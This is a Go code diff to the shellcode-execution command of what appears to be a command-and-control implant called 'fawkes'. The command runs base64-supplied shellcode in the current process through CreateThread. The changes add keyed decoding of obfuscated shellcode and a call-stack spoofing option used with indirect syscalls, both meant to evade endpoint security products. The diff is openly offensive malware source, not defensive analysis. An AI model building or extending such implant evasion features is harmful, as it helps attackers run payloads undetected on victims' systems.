@@ -4,7 +4,6 @@ package commands
 
 import (
 	"encoding/base64"
-	"encoding/json"
 	"unsafe"
 
 	"fawkes/pkg/structs"
@@ -21,10 +20,6 @@ func (c *ExecuteShellcodeCommand) Description() string {
 	return "Execute shellcode in the current process"
 }
 
-type executeShellcodeArgs struct {
-	ShellcodeB64 string `json:"shellcode_b64"`
-}
-
 var (
 	procCreateThread     = kernel32.NewProc("CreateThread")
 	procWaitSingleObject = kernel32.NewProc("WaitForSingleObject")
@@ -33,12 +28,12 @@ var (
 )
 
 func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResult {
-	var args executeShellcodeArgs
 	if task.Params == "" {
 		return errorResult("Error: shellcode_b64 parameter required")
 	}
-	if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
-		return errorf("Error parsing parameters: %v", err)
+	args, parseErr := unmarshalParams[executeShellcodeArgs](task)
+	if parseErr != nil {
+		return *parseErr
 	}
 	if args.ShellcodeB64 == "" {
 		return errorResult("Error: shellcode_b64 is empty")
@@ -51,6 +46,18 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 
 	if len(shellcode) == 0 {
 		return errorResult("Error: shellcode is empty after decoding")
+	}
+
+	if args.Encoding != "" && args.Encoding != "none" {
+		shellcode, err = decodeShellcode(shellcode, args.Encoding, args.Key)
+		if err != nil {
+			return errorf("Error decoding shellcode (%s): %v", args.Encoding, err)
+		}
+	}
+
+	if args.StackSpoof {
+		SetAPISpoofEnabled(true)
+		defer SetAPISpoofEnabled(false)
 	}
 
 	currentProcess := ^uintptr(0) // -1 = current process pseudohandle
@@ -78,7 +85,9 @@ func (c *ExecuteShellcodeCommand) Execute(task structs.Task) structs.CommandResu
 	}
 	injectCloseHandle(hThread)
 
-	if IndirectSyscallsAvailable() {
+	if args.StackSpoof && APISpoofAvailable() {
+		method = "Spoofed stack + indirect syscalls"
+	} else if IndirectSyscallsAvailable() {
 		method = "Indirect syscalls (calls from ntdll)"
 	}
 
